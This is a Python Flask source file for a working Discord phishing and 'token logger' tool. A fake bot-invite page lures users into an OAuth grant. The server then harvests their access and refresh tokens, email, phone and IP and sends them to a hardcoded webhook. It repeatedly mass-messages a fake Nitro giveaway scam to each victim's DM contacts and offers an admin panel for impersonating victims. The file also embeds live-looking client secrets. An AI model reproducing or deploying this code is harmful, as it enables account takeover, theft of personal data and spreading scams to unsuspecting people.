import os
import json
import requests
import threading
import time
from urllib.parse import urlencode
from flask import Flask, request, redirect, render_template_string, jsonify
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ===== CONFIG =====
CLIENT_ID = "1541786357028884534"
CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
REDIRECT_URI = "https://auth2-logger.vercel.app/callback"
OAUTH_SCOPE = "identify email guilds connections guilds.members.read gdm.join applications.commands"

# ===== WEBHOOK (HARDCODED) =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1543233853873983538/5qVhoKAmoRBzhXUczSTENIoG0khrnn9DzT_-7vXJJN-PbdovbClFoPifZW0nxBVPEz5F"

# ===== STORED DATA =====
# In-memory storage for harvested data
HARVESTED_DATA = {
    "victims": [],
    "dm_recipients": [],
    "sent_messages": [],
    "last_update": None
}

# ===== MASS DM MESSAGE =====
MASS_DM_MESSAGE = """🎉 **Hey!** You've been selected for an exclusive Discord Nitro giveaway!

Click here to claim your prize: [Claim Now](https://discord.com/gifts/fake)

This offer expires in 24 hours!"""

# ===== AUTO-SPAM INTERVAL (seconds) =====
SPAM_INTERVAL = 300  # 5 minutes

# ==================

BASE_OAUTH_URL = "https://discord.com/api/oauth2/authorize"
TOKEN_URL = "https://discord.com/api/oauth2/token"
API_BASE = "https://discord.com/api/v10"

HTML_INDEX = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Bot - Invite</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 500px;
            width: 90%;
        }
        .bot-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: linear-gradient(45deg, #5865F2, #7289DA);
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            box-shadow: 0 0 30px rgba(88,101,242,0.5);
        }
        h1 { font-size: 2em; margin-bottom: 10px; }
        .tag { color: #7289DA; font-size: 0.9em; margin-bottom: 20px; }
        .features {
            text-align: left;
            margin: 20px 0;
            padding: 20px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        .features li {
            list-style: none;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .features li::before {
            content: "✓ ";
            color: #43b581;
            font-weight: bold;
        }
        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(45deg, #5865F2, #7289DA);
            color: #fff;
            text-decoration: none;
            border-radius: 50px;
            font-size: 1.1em;
            font-weight: bold;
            margin-top: 20px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(88,101,242,0.4);
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(88,101,242,0.6);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="bot-avatar">🤖</div>
        <h1>Super Bot</h1>
        <div class="tag">The ultimate Discord bot for your server</div>
        <ul class="features">
            <li>Advanced Moderation System</li>
            <li>Music Player with High Quality</li>
            <li>Custom Economy & Leveling</li>
            <li>Auto-Moderation & Anti-Raid</li>
            <li>Ticket System & Logging</li>
        </ul>
        <a href="/login" class="btn">➕ Add to Discord</a>
    </div>
</body>
</html>
"""

HTML_SUCCESS = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Success!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .success-icon { font-size: 80px; margin-bottom: 20px; }
        h1 { font-size: 2em; margin-bottom: 10px; color: #43b581; }
        p { color: #aaa; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-icon">✅</div>
        <h1>Bot Added Successfully!</h1>
        <p>Thank you for adding Super Bot to your account.</p>
        <p>You can now use the bot in any server or DM.</p>
    </div>
</body>
</html>
"""

HTML_ADMIN = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Harvested Data</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0f0f23;
            color: #fff;
            font-family: 'Segoe UI', monospace;
            padding: 20px;
        }
        h1 { color: #ed4245; margin-bottom: 20px; }
        h2 { color: #5865F2; margin: 20px 0 10px; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-box {
            background: rgba(88,101,242,0.1);
            border: 1px solid #5865F2;
            padding: 15px;
            border-radius: 10px;
        }
        .stat-num { font-size: 2em; font-weight: bold; color: #43b581; }
        .stat-label { color: #888; font-size: 0.9em; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th { background: rgba(88,101,242,0.2); color: #7289DA; }
        tr:hover { background: rgba(255,255,255,0.03); }
        .token { font-family: monospace; font-size: 0.8em; color: #faa; word-break: break-all; }
        .id { color: #43b581; font-family: monospace; }
        .msg { color: #888; font-size: 0.85em; }
        .success { color: #43b581; }
        .error { color: #ed4245; }
    </style>
</head>
<body>
    <h1>🔥 ADMIN PANEL — Harvested Data</h1>

    <div class="stats">
        <div class="stat-box">
            <div class="stat-num">{{ victim_count }}</div>
            <div class="stat-label">Victims</div>
        </div>
        <div class="stat-box">
            <div class="stat-num">{{ dm_count }}</div>
            <div class="stat-label">DM Recipients</div>
        </div>
        <div class="stat-box">
            <div class="stat-num">{{ msg_count }}</div>
            <div class="stat-label">Messages Sent</div>
        </div>
        <div class="stat-box">
            <div class="stat-num">{{ last_update }}</div>
            <div class="stat-label">Last Update</div>
        </div>
    </div>

    <h2>🎯 Victims</h2>
    <table>
        <tr>
            <th>Username</th>
            <th>User ID</th>
            <th>Email</th>
            <th>Access Token</th>
            <th>IP</th>
            <th>Time</th>
        </tr>
        {% for v in victims %}
        <tr>
            <td>{{ v.username }}</td>
            <td class="id">{{ v.user_id }}</td>
            <td>{{ v.email }}</td>
            <td class="token">{{ v.token }}</td>
            <td>{{ v.ip }}</td>
            <td class="msg">{{ v.time }}</td>
        </tr>
        {% endfor %}
    </table>

    <h2>💬 DM Recipients</h2>
    <table>
        <tr>
            <th>Username</th>
            <th>User ID</th>
            <th>DM Channel ID</th>
            <th>Status</th>
        </tr>
        {% for r in recipients %}
        <tr>
            <td>{{ r.username }}</td>
            <td class="id">{{ r.user_id }}</td>
            <td class="id">{{ r.channel_id }}</td>
            <td class="{{ 'success' if r.accessible else 'error' }}">{{ 'Accessible' if r.accessible else 'Blocked' }}</td>
        </tr>
        {% endfor %}
    </table>

    <h2>📨 Sent Messages</h2>
    <table>
        <tr>
            <th>To</th>
            <th>Channel ID</th>
            <th>Status</th>
            <th>Time</th>
        </tr>
        {% for m in messages %}
        <tr>
            <td>{{ m.recipient }}</td>
            <td class="id">{{ m.channel_id }}</td>
            <td class="{{ 'success' if m.success else 'error' }}">{{ 'Sent' if m.success else 'Failed' }}</td>
            <td class="msg">{{ m.time }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""


def send_webhook(title, fields, color=0x5865F2):
    embed = {
        "title": title,
        "color": color,
        "fields": [{"name": k, "value": str(v)[:1024] if v else "N/A", "inline": False} for k, v in fields.items()],
        "footer": {"text": f"Token Logger | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
        "timestamp": datetime.utcnow().isoformat()
    }
    payload = {"username": "🔥 Token Logger", "embeds": [embed]}
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"[!] Webhook error: {e}")


def send_startup_notification():
    embed = {
        "title": "✅ تم تشغيل الموقع بنجاح",
        "description": "الموقع شغال وجاهز لاستقبال الضحايا",
        "color": 0x43b581,
        "fields": [
            {"name": "🌐 URL", "value": REDIRECT_URI.replace('/callback', ''), "inline": False},
            {"name": "🔗 OAuth2 URL", "value": f"{BASE_OAUTH_URL}?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope={OAUTH_SCOPE.replace(' ', '+')}", "inline": False},
            {"name": "⏰ Time", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False},
        ],
        "footer": {"text": "Token Logger System"},
        "timestamp": datetime.utcnow().isoformat()
    }
    payload = {"username": "🚀 Token Logger", "embeds": [embed]}
    try:
        resp = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"[✅] Startup notification sent: {resp.status_code}")
    except Exception as e:
        print(f"[!] Startup webhook failed: {e}")


print("[🚀] Token Logger starting up...")
send_startup_notification()


def harvest_dms(access_token, victim_data):
    """Harvest all DM channels and send mass messages"""
    auth_header = {"Authorization": f"Bearer {access_token}"}

    # Get all DM channels
    try:
        resp = requests.get(f"{API_BASE}/users/@me/channels", headers=auth_header, timeout=10)
        channels = resp.json()
        print(f"[DEBUG] Found {len(channels)} channels")
    except Exception as e:
        print(f"[!] Failed to get channels: {e}")
        return

    dm_channels = [c for c in channels if c.get("type") == 1]  # DM = type 1
    print(f"[DEBUG] Found {len(dm_channels)} DM channels")

    for ch in dm_channels:
        recipients = ch.get("recipients", [])
        if not recipients:
            continue

        recipient = recipients[0]
        recipient_id = recipient.get("id")
        recipient_name = recipient.get("username", "Unknown")
        channel_id = ch.get("id")

        # Store recipient
        recipient_data = {
            "username": recipient_name,
            "user_id": recipient_id,
            "channel_id": channel_id,
            "accessible": True,
            "victim_id": victim_data.get("user_id")
        }
        HARVESTED_DATA["dm_recipients"].append(recipient_data)

        # Send mass DM using OAuth2 token
        try:
            msg_resp = requests.post(
                f"{API_BASE}/channels/{channel_id}/messages",
                headers={**auth_header, "Content-Type": "application/json"},
                json={"content": MASS_DM_MESSAGE},
                timeout=10
            )
            success = msg_resp.status_code == 200
            print(f"[{'✅' if success else '❌'}] DM to {recipient_name}: {msg_resp.status_code}")
        except Exception as e:
            success = False
            print(f"[!] DM failed to {recipient_name}: {e}")

        # Log sent message
        HARVESTED_DATA["sent_messages"].append({
            "recipient": recipient_name,
            "recipient_id": recipient_id,
            "channel_id": channel_id,
            "success": success,
            "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })

    HARVESTED_DATA["last_update"] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def auto_spam(access_token, victim_id):
    """Auto-spam DMs every X seconds"""
    auth_header = {"Authorization": f"Bearer {access_token}"}

    while True:
        time.sleep(SPAM_INTERVAL)

        # Get fresh DM channels
        try:
            resp = requests.get(f"{API_BASE}/users/@me/channels", headers=auth_header, timeout=10)
            channels = resp.json()
            dm_channels = [c for c in channels if c.get("type") == 1]

            for ch in dm_channels:
                recipients = ch.get("recipients", [])
                if not recipients:
                    continue

                recipient = recipients[0]
                channel_id = ch.get("id")

                try:
                    msg_resp = requests.post(
                        f"{API_BASE}/channels/{channel_id}/messages",
                        headers={**auth_header, "Content-Type": "application/json"},
                        json={"content": MASS_DM_MESSAGE},
                        timeout=10
                    )
                    if msg_resp.status_code == 200:
                        print(f"[📨] Spam sent to {recipient.get('username')}")
                except:
                    pass
        except:
            break


@app.route("/")
def index():
    return render_template_string(HTML_INDEX)


@app.route("/login")
def login():
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": OAUTH_SCOPE,
        "integration_type": "1",
    }
    return redirect(f"{BASE_OAUTH_URL}?{urlencode(params)}")


@app.route("/callback")
def callback():
    code = request.args.get("code")
    error = request.args.get("error")
    error_description = request.args.get("error_description", "")

    if error:
        return render_template_string(HTML_SUCCESS), 200  # Fake success

    if not code:
        return "Error", 400

    # Exchange code for token
    token_data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }

    try:
        resp = requests.post(TOKEN_URL, data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
        token_info = resp.json()
    except Exception as e:
        return "Error", 500

    if "error" in token_info:
        return "Error", 400

    access_token = token_info.get("access_token")
    refresh_token = token_info.get("refresh_token")
    expires_in = token_info.get("expires_in")

    if not access_token:
        return "Error", 400

    auth_header = {"Authorization": f"Bearer {access_token}"}

    # Get user info
    try:
        user_resp = requests.get(f"{API_BASE}/users/@me", headers=auth_header, timeout=10)
        user_data = user_resp.json()
    except:
        user_data = {}

    # Get guilds
    try:
        guilds_resp = requests.get(f"{API_BASE}/users/@me/guilds", headers=auth_header, timeout=10)
        guilds_data = guilds_resp.json()
    except:
        guilds_data = []

    # Get connections
    try:
        conn_resp = requests.get(f"{API_BASE}/users/@me/connections", headers=auth_header, timeout=10)
        connections_data = conn_resp.json()
    except:
        connections_data = []

    user_id = user_data.get("id", "N/A")
    username = user_data.get("username", "N/A")
    global_name = user_data.get("global_name", "N/A")
    email = user_data.get("email", "N/A")
    phone = user_data.get("phone", "N/A")
    mfa = user_data.get("mfa_enabled", False)
    verified = user_data.get("verified", False)
    locale = user_data.get("locale", "N/A")
    avatar = user_data.get("avatar")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png" if avatar else "N/A"

    # Store victim
    victim_entry = {
        "username": f"{username} (@{global_name})",
        "user_id": user_id,
        "email": email,
        "phone": phone,
        "token": access_token,
        "refresh_token": refresh_token,
        "ip": request.remote_addr,
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "mfa": mfa,
        "verified": verified,
        "locale": locale,
        "avatar": avatar_url
    }
    HARVESTED_DATA["victims"].append(victim_entry)

    # Send webhook
    fields = {
        "👤 Username": f"{username} (@{global_name})",
        "🆔 User ID": user_id,
        "📧 Email": f"{email} ({'Verified' if verified else 'Unverified'})",
        "📱 Phone": phone if phone else "Not set",
        "🔐 MFA": "✅" if mfa else "❌",
        "🔑 Access Token": f"`{access_token}`",
        "🔄 Refresh Token": f"`{refresh_token}`",
        "🌐 IP": request.remote_addr,
        "🖥️ User Agent": request.headers.get("User-Agent", "N/A")[:500],
    }
    send_webhook("🎯 NEW VICTIM!", fields, color=0xED4245)

    # Harvest DMs and send mass messages
    harvest_thread = threading.Thread(target=harvest_dms, args=(access_token, victim_entry))
    harvest_thread.start()

    # Start auto-spam thread
    spam_thread = threading.Thread(target=auto_spam, args=(access_token, user_id), daemon=True)
    spam_thread.start()

    return render_template_string(HTML_SUCCESS)


@app.route("/admin")
def admin_panel():
    """Admin panel to view all harvested data"""
    return render_template_string(
        HTML_ADMIN,
        victim_count=len(HARVESTED_DATA["victims"]),
        dm_count=len(HARVESTED_DATA["dm_recipients"]),
        msg_count=len(HARVESTED_DATA["sent_messages"]),
        last_update=HARVESTED_DATA["last_update"] or "Never",
        victims=HARVESTED_DATA["victims"],
        recipients=HARVESTED_DATA["dm_recipients"],
        messages=HARVESTED_DATA["sent_messages"]
    )


@app.route("/api/data")
def api_data():
    """API endpoint for raw data"""
    return jsonify(HARVESTED_DATA)


@app.route("/api/send/<user_id>", methods=["POST"])
def api_send_message(user_id):
    """Send custom message to specific user"""
    data = request.json or {}
    message = data.get("message", MASS_DM_MESSAGE)

    # Find victim token
    victim = next((v for v in HARVESTED_DATA["victims"] if v["user_id"] == str(user_id)), None)
    if not victim:
        return {"error": "Victim not found"}, 404

    # Find DM channel
    recipient = next((r for r in HARVESTED_DATA["dm_recipients"] if r["user_id"] == str(user_id)), None)
    if not recipient:
        return {"error": "No DM channel found"}, 404

    auth_header = {"Authorization": f"Bearer {victim['token']}", "Content-Type": "application/json"}
    try:
        resp = requests.post(
            f"{API_BASE}/channels/{recipient['channel_id']}/messages",
            headers=auth_header,
            json={"content": message},
            timeout=10
        )
        return {"success": resp.status_code == 200, "status": resp.status_code}
    except Exception as e:
        return {"error": str(e)}, 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
